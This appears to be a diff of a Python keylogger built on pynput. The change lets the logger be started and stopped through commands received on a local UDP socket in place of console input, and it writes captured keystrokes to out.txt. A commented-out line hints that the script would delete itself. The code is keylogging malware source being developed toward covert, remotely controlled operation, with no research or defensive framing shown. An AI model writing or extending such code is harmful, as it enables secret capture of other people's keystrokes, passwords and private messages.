@@ -1,4 +1,5 @@
 from pynput.keyboard import Key, Listener
+import socket
 
 
 output = []
@@ -19,17 +20,26 @@ def key_thread():
 
 
 def main():
-    log_dir = "C:/users/samsm/desktop/"
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    ip = "127.0.0.1" #localhost
+    port = 10101
+    addr = (ip, port)
+    sock.bind(addr)
+    
+
+    log_dir = "./"
 
     # remove(argv[0])
-    com = input("Command: ")
+    com = sock.recv(20).decode()
+    print(com)
     started = False
-    while com != "end":
+    while com != "stop":
         if com == "start" and not started:
             key_thread()
             started = True
         print(output)
-        com = input("Command: ")
+        com = sock.recv(20).decode()
+        print(com)
 
     fi = open(log_dir + "out.txt", "w")
     for i in output:
